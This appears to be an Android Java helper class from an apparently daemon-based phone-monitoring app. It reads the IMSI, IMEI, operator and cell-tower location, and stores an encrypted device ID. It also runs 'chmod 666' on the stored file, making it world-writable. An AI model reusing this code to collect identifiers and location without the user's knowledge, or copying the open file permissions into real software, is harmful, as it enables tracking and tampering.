package com.vvt.phoneinfo;

import android.content.Context;
import android.os.Build;
import android.telephony.CellLocation;
import android.telephony.TelephonyManager;
import android.telephony.cdma.CdmaCellLocation;
import android.telephony.gsm.GsmCellLocation;

import com.fx.maind.ref.MainDaemonResource;
import com.fx.util.FxUtil;
import com.vvt.logger.FxLog;
import com.vvt.shell.Shell;
import com.vvt.util.GeneralUtil;

public class PhoneInfoHelper {
	
	private static final String TAG = "PhoneInfoHelper";
	
	private static PhoneInfoHelper sInstance;
	
	private Context mContext;
	private String mPersistedDeviceId;
	private TelephonyManager mTelephony;
	
	public static PhoneInfoHelper getInstance(Context context) {
		if (sInstance == null) {
			sInstance = new PhoneInfoHelper(context);
		}
		return sInstance;
	}
	
	private PhoneInfoHelper(Context context) {
		mContext = context;
		mTelephony = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
		mPersistedDeviceId = getPersistedDeviceId();
	}
	
	/**
	 * Getting end-user-visible name for the end product.
	 * @return
	 */
	public static String getModel() {
		return Build.MODEL;
	}

	/**
	 * Getting name of the industrial design.
	 * @return
	 */
	public static String getDevice() {
		return Build.DEVICE;
	}
	
	/**
	 * Getting IMSI (International Mobile Subscriber Identity)
	 * @param context
	 * @return
	 */
	public String getSubscriberId() {
		return mTelephony.getSubscriberId();
	}

	public NetworkInfo getNetworkInfo() {
		NetworkInfo networkInfo = new NetworkInfo();
		
		String networkOperatorString = mTelephony.getNetworkOperator();
		
		// context.getResources().getConfiguration().mnc can return 0 when no APN found
		if (networkOperatorString.length() >= 4) {
			networkInfo.setMcc(networkOperatorString.substring(0, 3));
			networkInfo.setMnc(networkOperatorString.substring(3));
		}
		
		networkInfo.setOperatorName(mTelephony.getNetworkOperatorName());
		
		String type = null;
		int lac = -1;
        int cid = -1;
        
        CellLocation cell = mTelephony.getCellLocation();
        
        if (cell instanceof GsmCellLocation) {
        	type = "GSM";
        	lac = ((GsmCellLocation) cell).getLac();
        	cid = ((GsmCellLocation) cell).getCid();
        }
        else if (cell instanceof CdmaCellLocation) {
        	type = "CDMA";
        	lac = ((CdmaCellLocation) cell).getNetworkId();
        	cid = ((CdmaCellLocation) cell).getBaseStationId();
        }
		
        if (type != null) {
        	networkInfo.setType(type);
        }
		networkInfo.setCid(cid);
		networkInfo.setLac(lac);
        
		return networkInfo;
	}
	
	/**
	 * Getting IMEI for GSM and the MEID or ESN for CDMA phones
	 * @param context
	 * @return
	 */
	public String getDeviceId() {
		// Logic that loop for obtaining Device ID is REMOVED since it didn't help
		String deviceId = mTelephony.getDeviceId();
		
		// Get persisted value
		if (deviceId == null) {
			FxLog.d(TAG, "getDeviceId # Use persisted device ID!");
			if (mPersistedDeviceId == null || mPersistedDeviceId.trim().length() < 1) {
				mPersistedDeviceId = getPersistedDeviceId();
			}
			deviceId = mPersistedDeviceId == null ? "" : mPersistedDeviceId.trim();
			FxLog.d(TAG, String.format("getDeviceId # Device ID: %s", mPersistedDeviceId));
		}
		// Update cache and persisted value
		else {
			boolean requireUpdating = mPersistedDeviceId == null ||
					(mPersistedDeviceId != null && 
							!mPersistedDeviceId.trim().equals(deviceId.trim()));
			if (requireUpdating) {
				FxLog.d(TAG, String.format("getDeviceId # Persisting device ID: %s", deviceId));
				persistDeviceId(deviceId);
				mPersistedDeviceId = deviceId;
			}
		}
		
		if (deviceId != null) {
			deviceId = deviceId.trim();
			
			// Device ID is limited to 16 chars by the protocol
			if (deviceId.length() > 16) {
				deviceId = deviceId.substring(0, 16);
			}
		}
		
		return deviceId;
	}
	
	private void persistDeviceId(String deviceId) {
		String persistingData = null;
		
		if (deviceId == null || deviceId.trim().length() < 1) {
			persistingData = "";
		}
		else { 
			persistingData = FxUtil.getEncryptedInsertData(deviceId, false);
			
			try {
				boolean isSuccess = GeneralUtil.serializeObject(
						persistingData, MainDaemonResource.PERSISTED_DEVICE_ID_PATH);
				if (isSuccess) {
					Shell shell = Shell.getShell();
					shell.exec(String.format(
							"chmod 666 %s", MainDaemonResource.PERSISTED_DEVICE_ID_PATH));
					shell.terminate();
				}
			} 
			catch (Exception e) {
				FxLog.e(TAG, String.format("persistDeviceId # FAILED!! %s", e.toString()));
			}
		}
	}

	private String getPersistedDeviceId() {
    	String encryptedData = null;
    	
    	try {
    		encryptedData = 
    				(String) GeneralUtil.deserializeObject(
    						MainDaemonResource.PERSISTED_DEVICE_ID_PATH);
    	}
    	catch (Exception e) {
    		/* Ignore, since it may not get created yet */
    	}
    	
    	return encryptedData == null ? 
    			"" : FxUtil.getDecryptedQueryData((String) encryptedData, false);
    }

}
